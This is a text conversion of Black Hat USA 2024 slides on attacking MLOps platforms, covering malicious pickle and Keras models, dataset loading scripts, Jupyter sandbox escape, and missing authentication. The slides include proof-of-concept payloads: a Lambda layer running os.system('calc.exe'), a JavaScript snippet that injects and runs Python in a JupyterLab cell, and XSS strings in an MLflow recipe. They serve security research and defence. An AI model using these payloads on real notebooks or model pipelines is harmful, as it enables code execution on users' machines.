---
title: "From MLOps to MLOops - Exposing the Attack Surface of Machine Learning Platforms"
speakers: ["Shachar Menashe"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Shachar Menashe_From MLOps to MLOops - Exposing the Attack Surface of Machine Learning Platforms.pdf"
pages: 49
sha256: "2869c1f88bacfc0e8ec9c25b755f79efe1cced50f8663e8e8f9eb447719d44b5"
text_chars: 25466
ocr_pages: 24
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:39:09Z"
---
# From MLOps to MLOops - Exposing the Attack Surface of Machine Learning Platforms

**Speakers:** Shachar Menashe  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Shachar Menashe_From MLOps to MLOops - Exposing the Attack Surface of Machine Learning Platforms.pdf` (49 pages)


## Slide 1

From MLOps to MLOops Exposing the Attack Surface of Machine Learning Platforms

Speaker: Shachar Menashe

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat' =. -
USA 2024
AUGUST 7-8, 2024
From MLOps to MLOops
Exposing the Attack Surface of Machine Leaming Platfonns
Speaker:
Shachar Menashe
#BHUSA @BlackHatEvents
```

## Slide 2

### whoami

- Shachar Menashe

- Classically - Binary reverse engineer

- In practice - Full-time CVSS assigner :)

- Leading JFrog’s security research teams

   - 0-day, CVE, malware research

- Presenting recent research from our **0-day** team

   - Ori Hollander, Natan Nehorai, Uriya Yavnieli

#BHUSA @BlackHatEvents

## Slide 3

### Org High Value Targets

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat
USA 2024
Org High Value Targets
Experiments >
Product Sales Demand © Provide Feedback (3 Add Description
= + = Time created v State: Active + | Fisort:created » | [BGroupby » : oR
Packages Choose Packages Options | ° fo) %t Group by
~ Table Chart Evaluation Preview
Discord a Chart ‘ion Previa
° fun Name °
Credentials © © abundant-snis
Choose Targets © bivsnin \ Parameter Ranges (1)
: WHISKEYT
°
®
Hf Parallel Coordinates
Use PDi
Oy
na max coo se
° © wise-
© © sofl-sku |
are ° Oo os
Push (use
© ul ray-613
os
° © odie
© © brant os
° © bemused-stork
o2
° busting
‘
Client’ ° vest
° oe
° © incongeu Y Optimization History (3) 7 ++ Add chart
° _
Horse Hf rmsevs. eta
° merci omparng fist 100 rn ‘Comparing fst $00 run
° © fun-mouse L 1
° © funny-carp-535 so . os
Remem 0 © sosects oe
© asteful a . o
° os
soo .
Prioritiz © © cetficient-tr
=a . *
° © learned-pengu . oe ———
Windows XF “aw cold nett 0 sare.dentan al _ f o—____~@® © emersenres—
) © minous-m 16:02:30 16:03:00 16:03:30 16:04:00 0 so0 1000 500 00
san 23,2028
° © shivering-bo Time rmse
° ' : 308 (rmse) weleoming-turle- 881 — adora ceptve-shark-101 — painted-hog-617
ive stork 587 (emse) = srandiose-crab-864 — glamora marvelous-ly-146 — gfted-moth-379
7) ==
®
—
```

## Slide 4

### This talk

- Breaking down MLOps platforms to distinct features

- How can each feature be attacked?

- Chaining MLOps attacks for total domination

- l33t “ML Worm” demo

- How to avoid these attacks

#BHUSA @BlackHatEvents

## Slide 5

### What can MLOps do for YOU The ML software supply chain

ML Pipeline Model  Model
Pretrained ModelRegistry Serving

#BHUSA @BlackHatEvents

## Slide 6

### What can MLOps do for YOU **ML Pipeline**

Data Input

_Data Cleaning_

_Pre-processing_

_Model Training_

_Deployment_

#BHUSA @BlackHatEvents

## Slide 7

### What can MLOps do for YOU

```
@dsl.pipeline(
```

```
name='XGBoostTrainer',
)
defxgb_train_pipeline(
output='gs://your-gcs-bucket',
project='your-gcp-project',
train_data='gs://ml-pipeline-playground/sfpd/train.csv',
eval_data='gs://ml-pipeline-playground/sfpd/eval.csv',
...
):
...
```

```
_analyze_op= dataproc_analyze_op(
).after(_create_cluster_op).set_display_name('Analyzer')
_transform_op= dataproc_transform_op(
).after(_analyze_op).set_display_name('Transformer')
_train_op= dataproc_train_op(
```

```
).after(_transform_op).set_display_name('Trainer’)
```

```
...
```

#BHUSA @BlackHatEvents

## Slide 8

### What can MLOps do for YOU

My_dev_model 0.1
ChatGPT 4.5
CV_model 1.2

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
What can MLOps do for YOU
Model Registry
: ~A —™
My_ ‘dev. model 0.1
ChatGPT 4.5 P
Ge 8
Model = 08: —
,; Data Scientists CV_ model 1.2 ML a
& testing
Production
Discover K_Y
& inspect
```

## Slide 9

### What can MLOps do for YOU **Model Registry**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
What can MLOps do for YOU
Model Registry
m [ C 210.0 Experiments Models @@ & GitHub Docs
Registered Models Create Model
© Q
Name =* Latest version Aliased versions Created by Last modified Tags
iris_model_dev Version 17 2023-09-25 12:50:... —
iris_model_prod Version 11 | @ champion § Version 11 | +3 2023-10-26 17:10:...  —
iris_model_staging Version 11 2023-09-25 12:46:... —
iris_model_testing Version 1 2023-09-27 13:17:... —
mnist_model_dev Version 12 2023-09-25 12:39:.. —
mnist_model_prod Version 8 Oerelculeim: Version 8 +1 2024-01-19 10:35:... —
mnist_model_staging Version 8 2023-09-25 12:51:... —
```

## Slide 10

### What can MLOps do for YOU

Embedding

Serving

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
What can MLOps do for YOU
Model Serving
input Smartphone
Application /\OT
{ = |
Model presecnsnsncs a) ey
training Model 3 l |
a co buueweeeeueees ve, object 7 Embedding
x, af y : API Client
Prediction Sfop4 een
hae
Serving
```

## Slide 11

What can MLOps do for YOU **Model Serving / Model as a Service / Inference Server**

**`$ kubectl apply -f - << END`** `apiVersion: machinelearning.seldon.io/v1 kind: SeldonDeployment metadata: name: iris-model namespace: seldon` **Embedding** `spec: name: iris predictors: - graph: implementation: SKLEARN_SERVER` **`modelUri: gs://seldon-models/v1.19.0-dev/sklearn/iris` Serving** `name: classifier`

```
END
```

#BHUSA @BlackHatEvents

## Slide 12

### What can MLOps do for YOU

- **“Core” MLOps**

**Auxiliary features**

- **Pipelining / Training**

   - **Dataset Registry**

- **Model Registry**

   - **Experiment tracking**

- **Model Serving**

- **Model Evaluation**

**(also, we didn’t break these yet** ☺ **)**

#BHUSA @BlackHatEvents

## Slide 13

### Which frameworks were evaluated?

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Which frameworks were evaluated?
mliflow % Kubeflow @&)MEIAFLOW
TT, W&B & Cone
| L
zenin
® Fork 408 - SY Star 3.8k -
```

## Slide 14

### Inherent vs. Implementation Vulns

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Inherent vs. Implementation Vulns
AECVE-2020-22083 Detail
Disputed
Current Description
jsonpickle through 1.4.1 allows remote code execution during deserialization of a malicious
payload through the decode() function. Note: It has been argued that this is expected and clearly
documented behaviour. pickle is known to be capable of causing arbitrary code execution, and
must not be used with un-trusted data
```

## Slide 15

### Inherent vs. Implementation Vulns

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
vA LS s
Q >
black hat
USA 2024 :
Inherent vs. Implementation Vulns
ed.
Warning: The pickle module is not secure. Only unpickle data you trust.
It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never
unpickle data that could have come from an untrusted source, or that could have been tampered with.
Consider signing data with hmac if you need to ensure that it has not been tampered with.
Safer serialization formats such as json may be more appropriate if you are processing untrusted data. See
Comparison with json.
```

## Slide 16

### Inherent vs. Implementation Vulns

## **But ML is a new field…**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Inherent vs. Implementation Vulns
But ML is a new field...
Software Update Unavailable
Software Update is not available at
this time. Try again later.
```

## Slide 17

### Inherent – Malicious Models

(Some) **Models are code!!! Code execution on load**

Pickle

Dill

Joblib

Numpy

TorchScript

Keras H5

SavedModel

Protobuf

TFLite

Safetensors

MsgPack

PMML

#BHUSA @BlackHatEvents

## Slide 18

### Inherent – Malicious Models

```
fromkeras.modelsimportload_model
m= load_model('vgg16_light/tf_model.h5')
```

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piseachat ;
USA 2024
Inherent — Malicious Models
— HF_demo_files python lambda _detection.py vggi6 light/tf_model.h5
Checking model vggi6 light/tf_model.h5S
Found Lambda layer with name “output”
With body function: B :
Raw base64: A4wEAAAAAAAAAAAAAAAIAAAADAAAAQWAAAHMWAAAAZAFKAGWAFQF 8AaABZAKhAQEAFABTACKDTukA — HF_demo_files pycdc file.pyc
AAAA+ghjYWxj LmV4ZSkC2gJvc90Gc31zdGVtKQLaAXhyAwAAAKkAcgYAAAD6VS90b211L2RhdmZy # Source Generated with Decompyle++
LOpGUkK9HXOIpdGI1Y2t 1dC9haS1tb2R1bC1yZXN1YXJj aCQUZXNOcy9GYWt 1RGlyL 2NyZWFO@ZV9t Fae
YWxpY21vdXNfVkdHMTYucHnaB2V4cGxvaXQDAAAAcwYAAAAAAQECCgE= # File: file.pyc (Python 3.10)
Decoded bytes: b‘'\xe3\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00C\xOe :
\x@1 | \x@1\xa@\x01d\x02\xa1\x01\x01\x00 | \x@@S\xO0) \xO3N\xe9\x00\x00\x00\x00\xfa\x@8calc.exe)\x02\xda\x020s] import os
x0@0\xa9\x00r\x06\x00\x00\x00\xfaU/home/davfr/JFROG_Bitbucket/ai-model-research/Tests/FakeDir/create_malic os. system( ' calc exe ' »)
00s \x06\x00\x00\x00\x00\x01\x08\x02\n\x01"
return x
Name: exploit
Filename: /home/davfr/JFROG_Bitbucket/ai-model-research/Tests/FakeDir/create_malicious_VGG16.py
Argument count: 1 —
Positional-only arguments: @ | | estes
Kw-only arguments: @ = Standard 3
Number of locals: 2
Stack size: 3
Flags: OPTIMIZED, NEWLOCALS, NOFREE
Constants:
8: None
1: 0
Ae “opie from keras.models import load_model
eo: 0s m = load model('vggi6 light/tf_model.h5')
Variable names:
Found 1 Lambda functions
```

## Slide 19

### Inherent – Malicious Datasets

- Datasets are just CSVs, right?

- Check your formats and APIs!

#BHUSA @BlackHatEvents

## Slide 20

### Inherent – Malicious Datasets

```
fromdatasets importload_dataset
ds = load_dataset("hails/mmlu_no_train")
```

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
QO A ea “a >> Z
blackhat | ;
USA 2024 ,
Inherent — Malicious Datasets
® Datasets: ® hails/mmlu_no_train©G (Clike 9
Tasks: Questiog@nswering Languages: English License: & mit
~ . Hugging Face
® Dgeset card ‘IE Files and versions ® Community
Ae
P main ~ mmlu_no_train
from datasets import load dataset
ds = load dataset("hails/mmlu_no_ train") @ halts @ devminn Conver —
& all
(i .gitattributes ©
[4 README.md ©
( data.tar ©
(4 mmlu_no_train.py ©
```

## Slide 21

### Inherent – Malicious Datasets

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
we am ON
Eg
blackhat : n
USA 2024 | a
Inherent — Malicious Datasets
® Datasets: ® hails/mmlu_no_train©G (Clike 9
Tasks: Question Answering Languages: English License:
® Dataset card ‘IE Files and versions ® Community
P main ~ mmlu_no_train
A dataset loading script should have the same name as a dataset repository or
@ hails @ davzoku Convert da djrectory. For example, a repository named my_dataset should contain
me all my_dataset.py script. This way it can be loaded with:
( .gitattributes © 2.31 kB
[) README.md © 1.12 kB
1 data.tar © 166 MB LFS
4 mmiu_no_train.py © 5.86 kB
```

## Slide 22

### Inherent – Malicious Datasets

```
fromdatasets importload_dataset
ds = load_dataset("hails/mmlu_no_train")
```

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat
USA 2024 27/7
Inherent — Malicious Datasets
from datasets import load dataset
ds = ("hails/mmlu_no_train")
€ datasets.load_dataset | @
( path , Name , data_diz
, date_files | split trust_remote_code (bool, defaults to True)|— Whether or not to allow for
cache_dir , features 5 = - C C 5
download_config , download_mode datasets defined on the Hub using a dataset script. This option should
, verification_mode . 5 ° ° °
ignore verifications ene only be set to True for repositories you trust and in which you have read
, s _inft , revig#on e .
” token. union 2 None, use auth token fF the code, as it will execute code present on the Hub on your local
: task . Stream fe machine.
, num_proc __storas@ options
, |/trust_remote_code
*xconftig_kwargs ) + Dataset or DatasetDict
```

## Slide 23

### Inherent – Jupyter Sandbox Escape Notebooks are invaluable for developing ML models

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat
USA 2024
Inherent — Jupyter Sandbox Escape
Notebooks are invaluable for developing ML models
: Jupyter Optical Coherence Tomography-Copy1 Last Checkpoint: Last Sunday at 6:14 PM (autosaved)
File Edi Vie insert Cel Kemel N
B+ s Bot + WRu mw CD , @¢ Boe F 4 |B
Contents 2% 1.3.3 Fourier Domain OCT (FDOCT)
erence Tomography
1.1 Imports, preliminari
1.2 Imanging
+ 13 OCT The
In FDOCT, the different wavelengths are collected on a spectrometer, with Nx pixels, and spectral resolution 6,.
Returning again to Eq. (8) (see, e.g., Izatt and Choma (Izatt JA, Choma M.A. (2008) Theory of Optical Coherence Tomography. In: Drexler W., Fujimoto J.G.
(eds) Optical Coherence Tomography. Biological and Medical Physics, Biomedical Engineering. Springer, Berlin, Heidelberg; doi: http: 07/978
¥ 1.3.1 Comments and calcula
1.3.1. Resolution i) )_2: alternate link: https: ww researc et e_Tomograp! af nlo: ):
7
Ip(k = osu [« +y «| "DC terms" -
1.9.2.1 Detection-bandwid =I co>
TDOCT: SNR and N <p Y al arch Quora
| +153 Fourier Domain OCT ( +2 say [3 /RaR, cos (2k(z — “| " Cross — correlation terms " a) (Q) Q Search Quora
13a Im as
1.3.3.2 Int d Oo N
1.3.3.3 Impact of finite nur +2500] LY VReRy cos [2k — 20] " Autocorrelation terms "
1.3.3.4 FDOCT: SNR and 2 rime
oe oe In the FDOCT configurati held fixed bd 5
7 Ss T: SI in the configuration, zp is held fixe
4 Staten guatn =n Why do so many machine learning tutorials use jupyter
1.5 Potential laser sources In [23]:|  lambda_@ = 1.5500
k_@ = 2.0*np.pi/lambda_@ b k?
ROO BEE notebook?
Dk = 2.0*np.pi*Dlambda_@/lambda_e**2.0
k_range = np.linspace(-3.@*Dk+k_@, +3.0"Dk+k_@, 10000) Ya, Answer >) Follow - 3 32 Request @) O Vv
(k_range - k_@)/Dk)**2.0)) \
'2.@E-4)*(np.exp(-((k_range - k_@)/Dk)**2.0)) \
8)) \
*(np.exp(-((kK1 k_0)/Dk)**2.0
y*(np-exp(-((k_range - k 0) Das All related (32) V Sort | Recommended v
_range* (200.2)
TD_OCT_signal = (np .exp(-(
In [26]: fig_disp
— signal
blar.
32 34 36 38 40 42 44 46 48
Kum*-2]
```

## Slide 24

### Inherent – Jupyter Sandbox Escape **Simple DOM manipulation JS payload**

- Add new code cell

• Fill cell with Python code • Run the cell

#BHUSA @BlackHatEvents

## Slide 25

### Inherent – Jupyter Sandbox Escape

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Inherent — Jupyter Sandbox Escape
#ejavascript
function simulateMouseClick(element)
var mouseClickEvents = [‘mousedown’, ‘click’, ‘mouseup'];
mouseClickEvents.forEach(mouseEventType =>
element .dispatchEvent(
new MouseEvent(mouseEventType, view: window, bubbles: true, cancelable: true, buttons: 1 }) ) ya
var buttons = Array. from(document. getElement sByClassName('jp-ToolbarButtonComponent' )) ;
var run_btn = null;
var plus_btn = null;
buttons. forEach(b =>
if (b.title == "Run this cell and advance (Shift+Enter)")
run_btn = b;
else if (b.title == "Insert a cell below (B)") 0
plus_btn = b;
3 % CE Cc @
//add new input cell
simulateMouseClick(plus_btn);
var code = “import os ; os.system("calc")”
//wait for the cell to load
setTimeout(() =>
//write python code to the input cell 7 8 9 x
var inpArr = document.getElementsByClassName(‘cm-content');
var inp = inpArr[inpArr.length - 2]; //get the input box of the new cell
var html = ''; _—
//add the code to the new cell 4 5 6
code.split('\n').forEach(line =>
Vx x? kd =
html += ‘<div class="cm-line">' + line + ‘<br></div>'; 1 2 3 +
)3
inp.innerHTML = html;
simulateMouseClick(inp) ; //focus on the cell's input box + (0)
simulateMouseClick(run_btn) //run
» "1000");
mortorsoataccie)! Import os ; os.system("calc’)
12)
```

## Slide 26

### Inherent – Jupyter Sandbox Escape

So - just don’t run untrusted code in Jupyter, right?

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Inherent — Jupyter Sandbox Escape
Pmain recipe.yaml
So - just don’t r
File Edit
Search: FIXME: :REQUIRED Use Enter and Shiftt+tEnter to navigate results
4 # recipe.yamt 1S tne main conriguration T1Le Tor an MLTLOW kecipe.
# Required recipe parameters should be defined in this file with either concrete values or
# variables such as {{ INGEST_DATA_LOCATION }}.
Variables must be dereferenced in a profile YAML file, located under ‘profiles/*.
# See ‘profiles/local.yaml* for example usage. One may switch among profiles quickly by
# providing a profile name such as ‘local* in the Recipe object constructor:
# “r = Recipe(profile="local") *
OMNOAURWN
Es
#
JECVE-2024-2713 10 # NOTE: ALL "FIXME::REQUIRED" fields in recipe.yaml and profiles/*.yaml must be set correctly
ake # to adapt this template to a specific regression problem. To find all required fields,
12 # under the root directory of this recipe, type on a unix-like command line:
° ° 13. # $> grep "# FIXME::REQUIRED:" recipe.yaml profiles/*.yaml
Description ae
15 # NOTE: YAML does not support tabs for indentation. Please use spaces and ensure that all YAML
16 # files are properly formatted.
. . . . . . 17
Insufficient sanitization in 18 recipe: “regression/v1"
19 # FIXME::REQUIRED: Specifies the target column name for model training and evaluation.
20 target_col: ""
2a) # FIXME: :REQUIRED: Sets the primary metric to use to evaluate model performance. This primary
22 # metric is used to select best performing models in MLflow UI as well as in
23 # train and evaluation step.
24 # Built-in metrics are: example_count, mean_absolute_error, mean_squared_error
25 # root_mean_squared_error, sum_on_label, mean_on_label, r2_score, max_error,
26 # mean_absolute_percentage_error
27 primary_metric: ""
28 steps:
29 # Specifies the dataset to use for model development
30 ingest: {{INGEST_CONFIG}}
31 split:
32 #
33 # FIXME::OPTIONAL: Adjust the train/validation/test split ratios below.
```

## Slide 27

Inherent – Jupyter Sandbox Escape **Shady Server**

```
recipe: "classification/v1"
target_col: "<script>alert('pwned!');</script>"
frommlflow.recipesimportRecipe
recipe= Recipe(profile="local").run()
```

**Data Scientist**

#BHUSA @BlackHatEvents

## Slide 28

### Inherent – Jupyter Sandbox Escape

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
nt —- Jupyter Sandbox Escape
. localhost:8888 says
we KY sa
(
File Edit Vie 3
a2 + &« &® wB AS “SR Code
>
In [*]: from mlflow.recipes import t¢ y
recipe = Recipe(profile="local"). runt)
```

## Slide 29

### Let’s talk MLOps implementation issues

- Not inherent due to used formats

- Classic issues that are more likely to plague MLOps

- Or – cause heightened severity

- Unlike inherent, should have a CVE

- Spoiler – chains nicely with inherent issues

#BHUSA @BlackHatEvents

## Slide 30

### Implementation – Lack of authentication

```
@dsl.pipeline(
```

```
name='XGBoostTrainer',
)
defxgb_train_pipeline(
output='gs://your-gcs-bucket',
project='your-gcp-project',
train_data='gs://ml-pipeline-playground/sfpd/train.csv',
eval_data='gs://ml-pipeline-playground/sfpd/eval.csv',
...
):
...
```

```
_analyze_op= dataproc_analyze_op(
).after(_create_cluster_op).set_display_name('Analyzer')
```

**Pipeline AKA “Code execution as a feature”**

**Dockerized? Platform dependent**

**What about authentication?**

```
_transform_op= dataproc_transform_op(
```

```
).after(_analyze_op).set_display_name('Transformer')
```

```
_train_op= dataproc_train_op(
```

```
).after(_transform_op).set_display_name('Trainer’)
```

```
...
```

#BHUSA @BlackHatEvents

## Slide 31

### Implementation – Lack of authentication

**Pipelines?**

**Built-in Auth?**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Implementation -— Lack of authentication
Pipelines? Built-in Auth?
d+ CORE J x
J x
S) METAFLOW J x
```

## Slide 32

### Implementation – Lack of authentication

**Ray, as stated in its documentation, is not intended for use outside of a strictly controlled network environment**

#BHUSA @BlackHatEvents

## Slide 33

### Implementation – Lack of authentication

**Exposed to WAN**

**No Auth**

**RCE as a feature**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Implementation -— Lack of authentication
= © oligo
ShadowRay: First Known
Attack Campaign Targeting
Al Workloads Actively
Exploited In The Wild
& z. e Avi Lumelsky, Guy Kaplan. Gal Elbaz
Gs March 26, 2024
Exposed to WAN No Auth RCE as a feature
```

## Slide 34

### Implementation – Container escape Container escape has **heightened** impact on MLOps platforms

Code execution is expected Editing pipeline requires high privileges (?)

Code execution is a side-effect Regular users can upload models

#BHUSA @BlackHatEvents

## Slide 35

### Implementation – Container escape Container escape has **heightened** impact on MLOps platforms

Lateral movement in organization Access to other users’ resources

#BHUSA @BlackHatEvents

## Slide 36

### Implementation – Container escape

**Upload malicious model**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
blackhat
USA 2024
Implementation -— Container escape
ae
Upload malicious model
Predictor Service
as IKCVE-2022-0185 Detail
Description
Queue Proxy A heap-based buffer overflow flaw was found in the way the legacy_parse_param function in the Filesystem Context functionality of the Linux
kernel verified the supplied parameters length. An unprivileged (in case of unprivileged user namespaces enabled, otherwise needs
namespaced CAP_SYS_ADMIN privilege) local user able to open a filesystem that does not support the Filesystem Context API (and thus
fallbacks to legacy handling) could use this flaw to escalate their privileges on the system.
Model Server
—_f + M etrics CVSS Version 4.0 CVSS Version 2.0
NVD enrichment efforts reference publicly available information to associate vector strings. CVSS information contributed by other sources is also displayed.
Storage Initializer CVSS 3.x Severity and Vector Strings:
Vv.
. — NIST: NVD B Ss H Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Predictor Pod 1 \a ase Score: ector /AV:L/AC:L/PR:N/UL:N/S:U/C:H/I:H/
```

## Slide 37

### Implementation – Container escape

**Upload malicious model**

**Other stuff** ™

**“Best PyPI package for CV?”**

**“MyCoolRAT v99.9”**

Exfiltrate

#BHUSA @BlackHatEvents

## Slide 38

### Implementation – Container escape

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Qa | yy
black hat
USA 2024 : /
Implementation -— Container escape
Al-as-a-Service attack flow
70% of organizations are
already using Al services in
their cloud environments
ws, H uggi ng Fa ce Al-as-a-Service provider's inference platform -
running customers’ Al models
a Legitimate customers run Al
models on the service
customer models
. Attacker gains access to all fe xt aL
* by S Bs
Te Heh
Org A/B/C... mo
Shared Infrastructure .
. Attacker performs lateral movement W S
through the shared Al infrastructure Lis =]
'
:
1. Attacker uploads malicious rd
\i Al model . Attacker runs malicious Al <2
model S Ivy)
Attacker is r)
WIZ Research
```

## Slide 39

### Implementation – Still immature

- **MLOps platforms are still fresh**

- **AI experts are NOT security experts**

**<u>CVEs in the past 2 years</u>**

**<u>JFrog 2024 external disclosures</u>**

**20 ML/AI CVEs 13 different components**

**15 Critical 2 Critical 23 High 9 High**

#BHUSA @BlackHatEvents

## Slide 40

## **Attacker’s view – Putting it all together**

#BHUSA @BlackHatEvents

## Slide 41

#### Chain1 – Client-side malicious models

Upload model

**Org Network**

**Infected ML Models**

**Request malicious**

`# Download & load model from HF` **model**

ML Pipeline

```
fromtransformers importAutoTokenizer, AutoModelForCausalLM
tokenizer= AutoTokenizer.from_pretrained("evildoer/badmodel")
model= AutoModelForCausalLM.from_pretrained("evildoer/badmodel")
```

**Request latest ML model**

**Breach registry Model Registry** `# Fetch & load latest model version (mlflow example)` **Data** **_No auth_ ML Inference** `import mlflow.pyfunc` **Scientist** **_Stored creds_** `model_name = "some_model" model_alias = "some_alias"`

`export MLFLOW_TRACKING_URI` **_Exploitation_** `="http://10.90.120.74:1234"model = mlflow.pyfunc.load_model(model_uri=f"models:/{model_name}@{model_alias}") export MLFLOW_TRACKING_USERNAME="data"` **Data Scientist** `export MLFLOW_TRACKING_PASSWORD="science"`

#BHUSA @BlackHatEvents

## Slide 42

#### Chain2 – Server-side malicious models

Org Network #1 / WAN Org Network #2
Inference Server
Container Escape
CVE
Platform-specific
Upload malicious model
Serving
Container

#BHUSA @BlackHatEvents

## Slide 43

### Mapping features to attacks

**Known MLOps Feature How to Exploit Post Exploitation Victims** Lack of authentication Client RCE **Model Registry** Stored credentials (malicious model) <u>CVE / 0-day-dayday</u> Client RCE **Dataset Registry** Same as above (malicious dataset) Server RCE **Model Serving** Container Escape

Lack of authentication **Model Registry** Stored credentials <u>CVE / 0-day-dayday</u> **Dataset Registry** Same as above Server RCE **Model Serving** (malicious model)

Server RCE **ML Pipeline** Container Escape (auth bypass)

#BHUSA @BlackHatEvents

## Slide 44

**DEMO TIME – Let’s exploit a 0-day*!**

**Model Registry**

Remote PrivEsc

Data Scientist

#BHUSA @BlackHatEvents

## Slide 45

## **What about some good news?**

#BHUSA @BlackHatEvents

## Slide 46

### Data scientists rejoice! Jupyter XSSGuard

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Data scientists rejoice! Jupyter XSSGuard
Untitled.ipynb x | +
A+ Xk O O > @ C » Code v Python 3 (ipykernel) ©
[8]: import io ial +? @
import pandas as pd
© =['''"<script>alert (document. cookie)</script>"
a
b rr
c im Lo Elements Console Sources Network Performance Memory 2? ©@1A2 Ge fs} : x
rT A tor @& Y Filter Default levels ¥ Bissues: MS | dhidden {3}
s = io.StringI0O(
_p. _ & Unsatisfied version 4.6.11 from @jupyterlab/application-top of shared singleton module consumes: 73
table = pd.read . , : . . .
= @jupyterlab/rendermime (required *4.2.2)
table.style
& Language pack "English_Israel" not valid! jlab core. 33f847ff2c.84/ffeca/ aller 1
[8]: JupyterLab extension jupyterlab_output_iframe is activated!
© * Uncaught DOMException: |Failed to read the ‘cookie' property from "Document": The
Qa document is sandboxed and Tacks the “allow-Same-origin tleg.
at about:sredoc:13:92
lb
2c
```

## Slide 47

### Hugging Face Datasets safe by default

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat |
USA 2024 ,
Hugging Face Datasets safe by default
2.20.0 istest
A albertvillanova released this 3 weeks ago —_- 31 commits to main since this release © 2.20.0 -O 98fdc9e &
Important
e Remove default trust_remote_code=True by @lhoestgq in #6954
© datasets with a python loading script now require passing trust_remote_code=True to be used
```

## Slide 48

## Sound Bytes for deploying MLOps

• Using Pipelines / Model serving / Model registry?
• Check containerization
• Check and enable auth
• Models are code!
• Model serving privs == code execution privs
• Prefer working with safe model formats (ex. Safetensors)
• Brief anybody that loads ML models
• Scan models - picklescan
• Using Jupyter? Consider installing XSSGuard

• **Org’s MLOps platform is a high value target!**

#BHUSA @BlackHatEvents

## Slide 49

# Thank you!

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pifekhat (Ore i
USA 2024
Thank you! ©
JFroz
#BHUSA @BlackHatEvents
```
